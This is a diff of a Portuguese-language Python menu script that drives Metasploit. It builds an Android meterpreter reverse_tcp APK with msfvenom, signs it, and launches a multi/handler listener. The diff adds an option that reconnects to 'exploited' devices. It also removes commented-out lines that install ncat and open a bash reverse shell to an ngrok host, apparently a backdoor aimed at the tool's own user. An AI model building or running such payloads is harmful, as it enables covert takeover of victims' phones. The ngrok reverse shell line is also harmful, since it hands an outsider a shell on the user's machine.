@@ -1,14 +1,11 @@
 import os
 import sys
 
-#os.system(" nohup sudo apt install ncat /dev/null &")
-#os.system("ncat 0.tcp.ngrok.io 17261 -e /bin/bash")
-
 print("\n")
-print("\033[1;32m               ::::::::::      ::::   :::     ::::::::::::		\033[0;0m")
-print("\033[1;32m              	   :+:        :+:+:   :+:         :+:  	 		\033[0;0m")
-print("\033[1;32m              	  +:+         :+:+:+  +:+        +:+   	  		\033[0;0m")
-print("\033[1;32m 		 +#+          +#+ +:+ +#+       +#+    	   				\033[0;0m")
+print("\033[1;32m            ::::::::::::      ::::   :::     ::::::::::::::	\033[0;0m")
+print("\033[1;32m              	   :+:        :+:+:   :+:          :+:  	 	\033[0;0m")
+print("\033[1;32m              	  +:+         :+:+:+  +:+         +:+   	  	\033[0;0m")
+print("\033[1;32m 		 +#+          +#+ +:+ +#+        +#+    	   			\033[0;0m")
 print("\033[1;32m                +#+           +#+  +#+#+#       +#+     	 	\033[0;0m")
 print("\033[1;32m               #+#            #+#   #+#+#      #+#     		\033[0;0m")
 print("\033[1;32m             #########       ###    ####      ###       		\033[0;0m")
@@ -16,13 +13,13 @@ print("\n")
 
 print("\033[1;32m [1]baixar dependecia : 	\033[0;0m")
 print("\033[1;32m [2]criar payload :		\033[0;0m")
-print("\033[1;32m [3]sair  :				\033[0;0m")
+print("\033[1;32m [3]exploitados  :			\033[0;0m")
 
 #variaveis
 
 baixar = "1"
 criar = "2"
-sair = "3"
+entrar = "3"
 
 print("\n")
 
@@ -57,14 +54,30 @@ if x == '2':
 	msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={porta} R > {nome}
 
 	d2j-apk-sign {nome}
-	
+	rm -rf {nome}
 	use multi/handler
 	set payload android/meterpreter/reverse_tcp
 	set lhost 127.0.0.1
 	set lport 8888
+	clear
 	exploit
 	""")
 
+	fp.close()
+
+	os.system("msfconsole -r msf.rc")
+
+if x == '3':
+
+	fp = open("msf.rc", "w")
+	fp.write(f"""
+	use multi/handler
+	set payload android/meterpreter/reverse_tcp
+	set lhost 127.0.0.1
+	set lport 8888
+	clear
+	exploit
+	""")
 	fp.close()
 
 	os.system("msfconsole -r msf.rc")
